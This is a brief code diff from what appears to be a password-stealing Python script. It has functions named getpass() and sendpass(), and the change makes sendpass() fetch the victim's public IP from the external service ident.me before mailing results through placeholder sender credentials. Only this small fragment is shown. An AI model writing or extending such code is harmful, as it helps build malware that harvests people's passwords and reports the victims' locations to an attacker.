@@ -78,7 +78,7 @@ def getpass():
 
 
 def sendpass():
-	host_ip = socket.gethostbyname(socket.gethostname())
+	host_ip = urllib.request.urlopen('https://ident.me').read().decode('utf8')
 	mailto="<<MAILTO>>"
 	email = "<<EMAIL>>"
 	pwd = "<<PASSWORD>>"
